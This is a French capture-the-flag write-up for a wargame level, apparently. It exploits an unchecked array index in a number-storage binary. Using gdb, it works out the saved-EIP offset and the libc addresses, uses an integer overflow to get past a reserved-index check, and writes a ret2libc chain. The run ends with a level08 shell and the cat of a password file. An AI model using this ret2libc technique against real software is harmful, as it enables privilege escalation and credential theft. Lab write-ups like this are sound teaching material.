# Level 07

```
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 420
 Index: 1
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 0
 Completed read command successfully
Input command: read
 Index: 1
 Number at data[1] is 420
 Completed read command successfully
Input command: read
 Index: -1
 Number at data[4294967295] is 0
 Completed read command successfully
Input command: store
 Number: 42
 Index: -2
 Completed store command successfully
Input command: readt
 Index: -2
 Number at data[4294967294] is 42
 Completed readt command successfully
Input command: quit
```
Ce programme nous permet de stocker des nombres dans un tableau. Cependant, certaines cases sont réservées pour `wil`.<br />
On peut voir que le programme utilise des entiers non signés pour stocker les index. Cela signifie que si on rentre un index négatif, il sera converti en un entier non signé. Par exemple, `-1` deviendra `4294967295` (2^32 - 1).

Après avoir désassemblé le programme, on sait que le tableau a une taille de 100 nombres mais il n'y a pas de check sur l'index.

Donc on peut trouver l'offset pour pouvoir écrire dans `saved eip` avec gdb

En premier temps on va trouver l'adresse de `saved eip`

```sh
(gdb) b main
(gdb) r
(gdb) i f
...
 Saved registers:
  ebp at 0xffffcc58, eip at 0xffffcc5c

```
Ensuite on va trouver l'adresse de stockage. En regardant le code disas, on apercoit que l'offset est l'adresse contenue à `saved eip` moins l'adresse contenue à `esp + 36` <br/>
On va devoir aussi diviser par 4 vu que les nombres sont stockés en four-byte integer. On obtient bien notre offset de 114 pour écrire notre ret2libc. 

```sh
(gdb) p $esp + 36
$8 = (void *) 0xffffca94
(gdb) p (0xffffcc5c - 0xffffca94)
$9 = 456
(gdb) p (0xffffcc5c - 0xffffca94) /4
$10 = 114
(gdb)
```

Trouvons toutes les adresses nécessaires pour faire la ret2libc: 
```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
```
En decimal ça nous donne:
 - system = 4159090384
 - /bin/sh = 4160264172
 - et l'offset de eip = 114

Malheureusement 114 modulo 3 n'est pas égale à 0 nous allons donc devoir trouver un moyen d'écrire à 114. Donc on peut overflow ou underflow l'int.

Comme l'index fourni est un int mais que le stockage est un unsigned int nous devons diviser par 4 le resultat de l'overflow (2^32 / 4) + 114

```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
